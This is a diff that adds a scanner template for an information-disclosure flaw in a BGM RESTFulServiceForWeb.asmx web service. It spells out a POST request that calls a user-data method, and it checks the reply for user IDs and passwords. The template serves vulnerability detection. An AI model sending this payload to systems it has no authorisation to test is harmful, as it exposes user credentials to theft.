@@ -1,0 +1,34 @@
+id: poc-yaml-bosure-bgm-restfulserviceforweb-asmx-info-leak
+info:
+  name: BGM RESTFulServiceForWeb.asmx Information Disclosure Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: info-leak
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/Service/RESTFulWebService/RESTFulServiceForWeb.asmx/Do?id="
+    headers:
+      Content-Type: application/json
+    body: |
+      {"Resource":"MethodCluster","Parameter":[["Method","Sky.PlatForm.Core.clsUser.GetData"],["Para","{\"$VER$\":{},\"filter\":{\"OrderBy\":\"DeptId,UserId,CreateDate DESC\"}}"]]}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "ReturnType"
+          - "UserId"
+          - "UserPassWord"
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "<"
+      - type: word
+        part: header
+        words:
+          - "application/json"
